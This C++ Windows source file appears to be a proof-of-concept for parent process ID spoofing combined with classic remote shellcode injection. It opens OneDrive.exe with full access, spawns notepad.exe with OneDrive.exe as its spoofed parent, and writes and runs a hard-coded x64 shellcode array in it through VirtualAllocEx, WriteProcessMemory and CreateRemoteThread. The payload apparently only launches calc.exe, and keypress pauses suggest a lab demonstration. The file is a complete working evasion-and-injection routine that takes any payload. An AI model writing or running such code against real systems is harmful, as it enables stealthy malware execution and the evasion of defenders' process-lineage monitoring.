#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <csignal>

DWORD getProcessID() {

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"OneDrive.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }
    CloseHandle(snapshot);

    return process.th32ProcessID;
}

int classic_injection(HANDLE process_handle, unsigned char* payload, unsigned int payload_size) {
    HANDLE hThread = NULL;
    DWORD ThreadId = 0;
    SIZE_T* lpNumberOfBytesWritten = 0;

    printf("\nClick to Alloc\n");
    getchar();
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(process_handle, NULL, payload_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("%-20s : 0x%-016p\n", "base addr", (void*)lpBaseAddress);

    printf("\nClick to Write\n");
    getchar();
    BOOL resWPM = WriteProcessMemory(process_handle, lpBaseAddress, (LPVOID)payload, payload_size, lpNumberOfBytesWritten);
    
    printf("\nClick to Spawn Thread\n");
    getchar();
    hThread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, (LPDWORD)(&ThreadId));

    return 0;
}


int main() {

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T st;
    HANDLE ph;
    unsigned char payload[] = {
0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    };
    unsigned int payload_size = 276;
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void*)payload);

    //FreeConsole();

    ph = OpenProcess(PROCESS_ALL_ACCESS, false, getProcessID());

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    InitializeProcThreadAttributeList(NULL, 1, 0, &st);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(ph), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("c:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);

    printf("\nSpawned - Now to Inject\n");
    getchar();

    classic_injection(pi.hProcess, payload, payload_size);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}